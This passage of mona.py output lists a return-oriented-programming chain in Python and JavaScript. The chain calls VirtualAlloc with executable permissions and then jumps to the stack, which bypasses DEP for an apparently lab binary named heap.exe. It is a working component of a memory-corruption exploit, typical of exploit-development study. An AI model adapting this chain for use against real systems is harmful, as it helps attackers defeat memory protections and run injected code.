      0x763f80c7,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x760012fc,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x76367cea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x75fed26d,  # PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x7749caba,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x763b5515,  # & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7747dfab,  # POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00e02a63,  # POP EDX # RETN [heap.exe] ** REBASED 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e012db,  # POP ECX # RETN [heap.exe] ** REBASED 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x774a79d8,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x75fc9686,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x763f80cb,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x762c3d88,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u80c7%u763f" + // 0x763f80c7 : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u12fc%u7600" + // 0x760012fc : ,# ptr to &VirtualAlloc() [IAT KERNEL32.DLL] ** REBASED ** ASLR
    "%u7cea%u7636" + // 0x76367cea : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%ud26d%u75fe" + // 0x75fed26d : ,# PUSH EAX # MOV DWORD PTR DS:[ESI+54],ECX # POP ESI # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ucaba%u7749" + // 0x7749caba : ,# POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u5515%u763b" + // 0x763b5515 : ,# & jmp esp [KERNELBASE.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%udfab%u7747" + // 0x7747dfab : ,# POP EBX # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u2a63%u00e0" + // 0x00e02a63 : ,# POP EDX # RETN [heap.exe] ** REBASED 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u12db%u00e0" + // 0x00e012db : ,# POP ECX # RETN [heap.exe] ** REBASED 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u79d8%u774a" + // 0x774a79d8 : ,# POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
    "%u9686%u75fc" + // 0x75fc9686 : ,# RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u80cb%u763f" + // 0x763f80cb : ,# POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u3d88%u762c" + // 0x762c3d88 : ,# PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ""); //  : 


--------------------------------------------------------------------------------------------------

